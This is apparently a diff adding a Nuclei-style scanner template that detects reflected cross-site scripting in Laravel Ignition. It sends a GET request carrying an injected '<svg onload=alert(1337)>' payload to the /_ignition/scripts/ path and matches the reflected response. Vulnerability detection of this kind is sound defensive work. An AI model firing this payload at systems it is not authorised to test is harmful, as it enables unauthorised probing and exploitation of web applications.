@@ -1,0 +1,26 @@
+id: laravel-ignition-xss
+info:
+  author: 0x_Akoko
+  name: Laravel Ignition XSS
+  reference:
+  - https://github.com/facade/ignition/issues/273
+  - https://www.acunetix.com/vulnerabilities/web/laravel-ignition-reflected-cross-site-scripting/
+  severity: medium
+  tags: laravel,xss,ignition
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - <svg onload=alert(1337)>
+  - status:
+    - 500
+    type: status
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(1337)>'
